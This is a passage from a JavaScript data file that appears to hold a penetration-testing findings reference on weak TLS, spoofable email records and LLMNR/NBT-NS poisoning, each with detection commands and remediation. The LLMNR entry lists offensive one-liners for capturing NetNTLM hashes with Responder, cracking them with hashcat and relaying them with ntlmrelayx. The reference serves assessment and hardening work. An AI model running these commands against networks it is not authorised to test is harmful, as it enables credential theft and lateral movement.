              "Set a strong Content-Security-Policy — the most impactful header; start in report-only mode and tighten.",
              "Enable HSTS with a long max-age (and preload once confident), plus X-Content-Type-Options: nosniff.",
              "Set frame-ancestors (CSP) and/or X-Frame-Options to prevent framing.",
              "Set Secure, HttpOnly, and SameSite on session cookies.",
              "Apply headers centrally (at the framework or edge/proxy) so every response is covered consistently."
            ]
          }
        ]
      },
      {
        id: "weak-tls",
        name: "Weak TLS / SSL Configuration",
        severity: "Medium",
        ref: "https://ssl-config.mozilla.org/",
        description: "Outdated protocols, weak ciphers, or bad certificates undermine transport security and enable interception.",
        brief: "TLS protects data in transit, but only if it is configured well. Support for obsolete protocols (SSLv3, TLS 1.0/1.1), weak cipher suites, small keys, or broken certificate validation opens the door to downgrade attacks, interception, and, in historical cases, named exploits (POODLE, BEAST, Heartbleed). Certificate problems — expired, self-signed on production, weak signatures, or mismatched names — erode trust and can enable man-in-the-middle.\n\nThe fix is a modern, minimal protocol and cipher configuration plus proper certificate management.",
        quickReference: [
          { label: "Scan the config", cmd: "testssl.sh https://target.com   or   sslscan target.com:443" },
          { label: "nmap ciphers", cmd: "nmap --script ssl-enum-ciphers -p443 target.com" },
          { label: "Red flags", cmd: "SSLv3, TLS 1.0/1.1, RC4/3DES/EXPORT ciphers, RSA<2048, expired/self-signed cert" },
          { label: "Reference config", cmd: "Mozilla SSL Configuration Generator (Intermediate/Modern)" }
        ],
        sections: [
          {
            title: "Weaknesses to Check",
            type: "table",
            columns: ["Issue", "Risk"],
            rows: [
              ["Old protocols", "SSLv3 / TLS 1.0 / 1.1 enabled — downgrade and known attacks"],
              ["Weak ciphers", "RC4, 3DES, EXPORT, NULL, or anything without forward secrecy"],
              ["Small keys / weak sig", "RSA < 2048, SHA-1 certificates"],
              ["Certificate issues", "Expired, self-signed on production, wrong hostname, untrusted CA"],
              ["Missing HSTS", "No enforcement of HTTPS, enabling SSL-strip (see Missing Security Headers)"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Tool", "Detail"],
            rows: [
              ["testssl.sh", "Comprehensive protocol, cipher, and vulnerability check"],
              ["sslscan / sslyze", "Fast enumeration of supported protocols and ciphers"],
              ["nmap ssl-enum-ciphers", "Grades cipher suites per protocol"],
              ["Browser / cert inspection", "Validity, chain, hostname, and signature algorithm"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Support only TLS 1.2 and 1.3; disable SSLv3 and TLS 1.0/1.1 entirely.",
              "Use strong cipher suites with forward secrecy (ECDHE); remove RC4, 3DES, and EXPORT.",
              "Use 2048-bit+ RSA or ECDSA keys and SHA-256+ certificate signatures from a trusted CA.",
              "Enable HSTS to enforce HTTPS and prevent downgrade; keep certificates valid and monitored.",
              "Base the config on Mozilla's generator and re-scan after changes."
            ]
          }
        ]
      },
      {
        id: "email-spoofing",
        name: "Spoofable Email (SPF / DKIM / DMARC)",
        severity: "Medium",
        ref: "https://dmarc.org/",
        description: "Weak or missing email-authentication records let attackers send mail that appears to come from the domain.",
        brief: "SPF, DKIM, and DMARC are the DNS records that let receiving servers verify that mail claiming to be from a domain is authorised. When they are missing, misconfigured, or set to monitor-only (DMARC p=none), an attacker can spoof the domain — sending phishing that passes as legitimate internal or brand email.\n\nIt is a common finding in OSINT and a direct enabler of phishing. The records are public, so the weakness is trivially assessed from the outside.",
        quickReference: [
          { label: "Check the records", cmd: "dig +short TXT target.com | grep spf1\ndig +short TXT _dmarc.target.com" },
          { label: "Weak DMARC", cmd: "v=DMARC1; p=none   -> monitor only, effectively spoofable" },
          { label: "SPF issues", cmd: "No SPF record, or ~all/+all (soft/pass) instead of -all" },
          { label: "Assess", cmd: "Online DMARC/SPF checkers; MXToolbox; or manual dig" }
        ],
        sections: [
          {
            title: "The Three Records",
            type: "table",
            columns: ["Record", "Role"],
            rows: [
              ["SPF", "Lists IPs/hosts allowed to send for the domain; -all hard-fails others"],
              ["DKIM", "Cryptographically signs messages so tampering/forgery is detectable"],
              ["DMARC", "Ties SPF/DKIM to the visible From domain and sets the policy (none/quarantine/reject)"],
              ["Alignment", "DMARC passes only if SPF/DKIM align with the From domain"]
            ]
          },
          {
            title: "Weaknesses",
            type: "table",
            columns: ["Condition", "Effect"],
            rows: [
              ["No SPF/DKIM/DMARC", "Domain is freely spoofable"],
              ["DMARC p=none", "Receivers take no action on failures — spoofing lands"],
              ["SPF ~all or +all", "Softfail/pass weakens or negates enforcement"],
              ["No DKIM", "Loses the cryptographic proof and a DMARC alignment path"],
              ["Missing subdomain policy", "sp= not set — subdomains remain spoofable"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Publish SPF listing only authorised senders and ending in -all (hard fail).",
              "Enable DKIM signing on all outbound mail streams.",
              "Set DMARC to p=quarantine, then p=reject after a monitoring period; include a subdomain policy (sp=).",
              "Use the DMARC rua/ruf reports to find and authorise legitimate senders before enforcing.",
              "Re-check the public records after changes; this is assessed entirely from outside."
            ]
          }
        ]
      },
      {
        id: "llmnr-nbtns",
        name: "LLMNR / NBT-NS Poisoning Enabled",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1557/001/",
        theory: "theory/2026-08-18-coercion-ntlm-relay.html",
        description: "Legacy multicast name-resolution fallbacks let an attacker on the LAN capture NetNTLM hashes to crack or relay.",
        brief: "When Windows fails to resolve a name over DNS, it falls back to broadcasting the query to the local segment over LLMNR, NBT-NS, or mDNS. An attacker on the same segment answers 'that's me', and the victim authenticates to them — handing over a NetNTLM hash to crack offline or relay onward.\n\nThese fallbacks are rarely needed and enabled by default, which makes poisoning one of the most reliable opening moves on an internal network. See the Coercion & NTLM Relay theory page.",
        quickReference: [
          { label: "Listen (recon)", cmd: "responder -I eth0 -A   (analyze only, no poisoning)" },
          { label: "Capture hashes", cmd: "responder -I eth0 -wd" },
          { label: "Crack", cmd: "hashcat -m 5600 hashes.txt rockyou.txt   (NetNTLMv2)" },
          { label: "Relay instead", cmd: "Disable Responder SMB/HTTP, then ntlmrelayx.py to unsigned targets" }
        ],
        sections: [
          {
            title: "The Fallback Protocols",
            type: "table",
            columns: ["Protocol", "Detail"],
            rows: [
              ["LLMNR (UDP 5355)", "The primary DNS fallback on modern Windows"],
              ["NBT-NS (UDP 137)", "Older NetBIOS name service, still commonly enabled"],
              ["mDNS (UDP 5353)", "Multicast DNS, another answerable path"],
              ["WPAD", "Proxy auto-discovery — prompts for auth via a rogue proxy"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Credential capture", "NetNTLMv2 hashes to crack offline (weak passwords fall fast)"],
              ["Relay to access", "Forward the auth to unsigned SMB/LDAP hosts for lateral movement"],
              ["Common foothold", "Frequently the first credential on an internal engagement"],
              ["Scale", "Mistyped/stale names generate a steady stream of victims"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable LLMNR via Group Policy (Turn off multicast name resolution) — the primary fix.",
              "Disable NBT-NS on all interfaces (DHCP option or per-adapter setting) and disable mDNS where not needed.",
              "Require SMB signing and LDAP channel binding so any captured auth cannot be relayed.",
              "Ensure DNS is correct and complete so hosts rarely need to fall back to broadcast resolution.",
              "Monitor for LLMNR/NBT-NS responders and enforce strong passwords + MFA to blunt cracked hashes."
            ]
          }
        ]
      }
    ]
  }
];
